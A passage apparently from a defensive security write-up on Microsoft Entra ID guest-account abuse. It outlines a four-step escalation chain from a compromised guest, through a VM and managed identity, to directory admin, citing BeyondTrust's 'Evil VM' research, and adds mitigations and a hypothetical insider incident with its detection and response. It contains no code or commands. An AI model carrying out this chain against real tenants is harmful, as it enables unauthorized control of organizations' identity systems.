- **Target:** Microsoft Entra ID environments
- **Exploitation Chain:**
  1. Compromise or socially engineer a guest user
  2. Use guest access to create a VM in a guest-owned subscription
  3. Assign a Managed Identity to the VM with escalated permissions
  4. Use the Managed Identity to escalate to Entra Directory Admin
- **Mitigation:** Restrict guest VM creation; audit managed identities
- **Reference:** [BeyondTrust: "Evil VM"](https://www.beyondtrust.com/blog/entry/evil-vm)

### Example 3: Simulated Internal Attack (Hypothetical 2025)

- **Scenario:** Disgruntled employee invited a personal external account as a guest
- **Timeline:** 
  - Day 1: External account invited as guest
  - Day 3: Guest creates subscription using personal billing account
  - Day 5: Guest creates UMI and assigns Owner role
  - Day 7: Guest provisions VM and accesses company data
- **Detection:** Manual subscription audit found unexpected subscription owner
- **Response:** Deleted guest subscription and revoked access; implemented guest creation restrictions
- **Lesson:** Guest accounts require the same scrutiny as internal accounts

---
